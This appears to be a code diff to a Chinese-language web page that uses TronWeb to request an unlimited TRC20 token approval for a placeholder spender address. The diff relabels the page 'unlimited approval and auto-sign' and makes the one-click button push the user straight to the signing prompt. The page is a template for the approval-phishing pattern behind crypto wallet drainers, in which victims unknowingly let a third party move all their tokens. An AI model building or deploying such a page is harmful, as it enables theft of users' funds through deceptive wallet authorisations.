@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRC20 无限授权</title>
+    <title>TRC20 无限授权和自动签名</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
 </head>
 <body>
-    <h1>TRC20代币授权</h1>
-    <button id="authorizeBtn">一键授权</button>
+    <h1>TRC20代币授权（自动跳转签名）</h1>
+    <button id="authorizeBtn">一键授权并签名</button>
 
     <script>
         const trc20ContractAddress = '代币合约地址'; // 替换为你想授权的代币合约地址
@@ -23,7 +23,12 @@
 
             try {
                 const contract = await tronWeb.contract().at(trc20ContractAddress);
-                const result = await contract.approve(spenderAddress, maxUint256).send();
+
+                // 直接发起授权请求，自动跳转到签名页面
+                const result = await contract.approve(spenderAddress, maxUint256).send({
+                    shouldPollResponse: true // 自动等待响应，直接触发签名
+                });
+
                 alert('授权成功！交易ID: ' + result);
             } catch (error) {
                 console.error('授权失败', error);
